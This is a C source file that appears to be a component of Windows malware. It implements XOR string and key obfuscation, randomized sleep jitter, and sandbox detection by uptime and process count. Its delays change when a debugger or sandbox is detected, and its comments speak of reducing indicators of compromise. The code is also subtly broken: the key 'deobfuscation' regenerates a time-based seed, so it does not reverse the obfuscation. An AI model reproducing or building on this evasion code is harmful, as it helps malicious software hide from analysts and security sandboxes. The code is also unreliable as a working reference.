/*
 * Author: 28Zaakypro@proton.me
 * Runtime XOR string obfuscation and timing jitter
 */

#include "obfuscation.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <psapi.h>

// Mix PID, tick count, and stack addr into a non-static seed
static DWORD GenerateObfuscationSeed(void)
{
    DWORD seed = 0;

    seed ^= GetCurrentProcessId();
    seed ^= GetTickCount();
    seed ^= (DWORD)(SIZE_T)&seed;

    seed = (seed << 13) | (seed >> 19);

    return seed;
}

// XOR each byte against a rotating byte of the seed
VOID ObfuscateKey(BYTE *key, SIZE_T keySize, BYTE *output)
{
    DWORD seed = GenerateObfuscationSeed();

    for (SIZE_T i = 0; i < keySize; i++)
    {
        BYTE seedByte = (BYTE)((seed >> ((i % 4) * 8)) & 0xFF);
        output[i] = key[i] ^ seedByte;
    }
}

// XOR is symmetric — same function for deobfuscation
BOOL DeobfuscateKey(BYTE *obfuscatedKey, SIZE_T keySize, BYTE *output)
{
    ObfuscateKey(obfuscatedKey, keySize, output);
    return TRUE;
}

// Sleep a random amount of time within [minMs, maxMs]
VOID RandomSleep(DWORD minMs, DWORD maxMs)
{
    static BOOL initialized = FALSE;
    if (!initialized)
    {
        srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
        initialized = TRUE;
    }

    DWORD range = maxMs - minMs;
    DWORD randomMs = minMs + (rand() % (range + 1));

    Sleep(randomMs);
}

// Adjust sleep duration based on environment (debugger / sandbox)
VOID AdaptiveSleep(DWORD baseMs)
{
    DWORD sleepTime = baseMs;

    if (IsDebuggerActive())
        sleepTime = baseMs / 10;       // shorten to avoid timeout
    else if (IsRunningInSandbox())
        sleepTime = baseMs * 3;        // extend to appear frozen

    // ±30% jitter
    DWORD minMs = (sleepTime * 70) / 100;
    DWORD maxMs = (sleepTime * 130) / 100;

    RandomSleep(minMs, maxMs);
}

// Decode a static XOR-encoded string at runtime
VOID DeobfuscateString(BYTE *obfuscated, SIZE_T length, BYTE key, char *output)
{
    for (SIZE_T i = 0; i < length; i++)
        output[i] = obfuscated[i] ^ key;

    output[length] = '\0';
}

BOOL IsRunningInSandbox(void)
{
    // Uptime under 10 min is a strong sandbox indicator
    if (GetTickCount64() < (10ULL * 60 * 1000))
        return TRUE;

    // Low process count = likely sandbox
    DWORD procs[1024], cbNeeded;
    if (EnumProcesses(procs, sizeof(procs), &cbNeeded))
    {
        if ((cbNeeded / sizeof(DWORD)) < 50)
            return TRUE;
    }

    return FALSE;
}

BOOL IsDebuggerActive(void)
{
    // API-based checks disabled to reduce IoCs
    // PEB-based detection handled in sandbox_evasion.c
    return FALSE;
}
